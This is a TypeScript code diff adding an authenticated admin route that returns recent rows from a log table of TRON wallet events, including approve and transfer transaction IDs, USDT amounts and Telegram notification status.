@@ -401,4 +401,76 @@ router.post("/user-wallet-transfers/notify", async (req: AuthenticatedRequest, r
   res.status(StatusCodes.OK).json({ status: "sent" });
 });
 
+router.get("/trust-tron/logs", async (req: AuthenticatedRequest, res) => {
+  const parsed = z
+    .object({
+      limit: z.coerce.number().int().min(1).max(200).optional()
+    })
+    .safeParse(req.query);
+
+  if (!parsed.success) {
+    throw new HttpError(parsed.error.message, StatusCodes.BAD_REQUEST);
+  }
+
+  const limit = parsed.data.limit ?? 20;
+
+  const logsResult = await walletDb.query<{
+    id: string;
+    created_at: Date;
+    event_type: string;
+    user_id: string | null;
+    wallet_address: string;
+    connect_method: string | null;
+    to_address: string | null;
+    amount_usdt: string | null;
+    approve_tx_id: string | null;
+    transfer_tx_id: string | null;
+    error_message: string | null;
+    telegram_sent: boolean;
+    telegram_sent_at: Date | null;
+    telegram_error: string | null;
+  }>(
+    `
+      SELECT
+        id,
+        created_at,
+        event_type,
+        user_id,
+        wallet_address,
+        connect_method,
+        to_address,
+        amount_usdt,
+        approve_tx_id,
+        transfer_tx_id,
+        error_message,
+        telegram_sent,
+        telegram_sent_at,
+        telegram_error
+      FROM trust_tron_telegram_logs
+      ORDER BY created_at DESC
+      LIMIT $1
+    `,
+    [limit]
+  );
+
+  res.status(StatusCodes.OK).json({
+    entries: logsResult.rows.map((row) => ({
+      id: row.id,
+      createdAt: row.created_at.toISOString(),
+      eventType: row.event_type,
+      userId: row.user_id,
+      walletAddress: row.wallet_address,
+      connectMethod: row.connect_method,
+      toAddress: row.to_address,
+      amountUsdt: row.amount_usdt ? Number(row.amount_usdt) : null,
+      approveTxId: row.approve_tx_id,
+      transferTxId: row.transfer_tx_id,
+      errorMessage: row.error_message,
+      telegramSent: row.telegram_sent,
+      telegramSentAt: row.telegram_sent_at ? row.telegram_sent_at.toISOString() : null,
+      telegramError: row.telegram_error
+    }))
+  });
+});
+
 export { router as adminRoutes };
